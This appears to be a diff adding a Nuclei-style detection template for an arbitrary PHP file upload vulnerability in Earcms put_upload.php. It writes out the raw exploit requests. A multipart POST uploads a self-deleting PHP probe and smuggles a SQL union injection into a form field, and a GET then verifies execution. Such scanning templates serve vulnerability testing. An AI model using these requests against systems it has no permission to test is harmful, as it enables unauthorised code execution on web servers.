@@ -1,0 +1,49 @@
+id: earcms-put-upload-file-upload
+info:
+  name: Earcms put_upload.php File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Earcms put_upload.php contains a vulnerability allowing arbitrary file uploads due to improper handling of SQL queries and hardcoded parameters.
+  tags: file-upload
+variables:
+  random_name: "{{rand_int(100000, 999999)}}"
+http:
+  - raw:
+      - |
+        POST /source/index/put_upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------141225804626496209592978386925
+
+        -----------------------------141225804626496209592978386925
+        Content-Disposition: form-data; name="ipa"; filename="{{random_name}}.php"
+        Content-Type: application/x-msdownload
+
+        <?php echo(md5(88)); $file = __FILE__; if (file_exists($file)) { @unlink($file); } ?>
+        -----------------------------141225804626496209592978386925
+        Content-Disposition: form-data; name="id"
+
+        -1  union SELECT "{{random_name}}.php";
+        -----------------------------141225804626496209592978386925
+        Content-Disposition: form-data; name="pw"
+
+        month-cf3b79c6e54ca7a8d50cdc8aedcde407
+        -----------------------------141225804626496209592978386925--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /data/attachment/{{random_name}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "2a38a4a9316c49e5a833517c45d31070"
